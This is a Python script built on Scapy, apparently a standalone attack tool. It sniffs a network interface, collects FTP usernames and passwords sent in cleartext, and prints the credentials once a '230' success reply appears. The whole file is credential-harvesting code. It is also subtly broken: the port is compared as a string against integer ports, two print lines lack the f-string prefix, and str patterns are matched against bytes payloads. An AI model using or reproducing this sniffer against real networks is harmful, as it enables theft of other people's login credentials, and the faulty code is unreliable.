import sys
import yaml
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
try:
    from scapy.all import *
except ImportError:
    print ('[!] Error: Scapy Installation Not Found')
    sys.exit(1)

# get config variables
with open(os.path.join((os.path.sep).join(os.path.realpath(__file__).split(os.path.sep)[:-1]), "config.yml"), "r") as ymlfile:
    config = yaml.safe_load(ymlfile)
interface = str(config['interface'])
ftp_port = str(config['ftp_port'])

# initialise user / pass lists
usernames = ['Error: Unlucky Timing']
passwords = ['Error: Unlucky Timing']

# check for a 230 response packet
def check_login(pkt, username, password):
    try:
        if '230' in pkt[Raw].load:
            print('[*] Valid Credentials Found')
            print(f"[*] {str(pkt[IP].dst).strip()} -> {str(pkt[IP].src).strip()}")
            print("[*] Username: {username}")
            print("[*] Password: {password}")
            return
        else:
            return
    except Exception:
        return

# checking for ftp 
def check_for_ftp(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].dport == ftp_port or pkt[TCP].sport == ftp_port:
            return True
        else:
            return False
    else:
        return False

def check_pkt(pkt):
    if check_for_ftp(pkt):
        pass
    else:
        return
    data = pkt[Raw].load
    if 'USER' in data:
        usernames.append(data.split('USER ')[1].strip())
    elif 'PASS' in data:
        passwords.append(data.split('PASS ')[1].strip())
    else:
        check_login(pkt, usernames[-1], passwords[-1])
    return

if __name__ == '__main__':
    print(f'[*] Sniffing Started on {interface}...\n')
    # try:
    sniff(iface=interface, prn=check_pkt, store=0)
    # except Exception:
    #     print('[!] Error: Failed to initialize sniffing')
    #     sys.exit(1)
    print('\n[*] Sniffing Stopped')



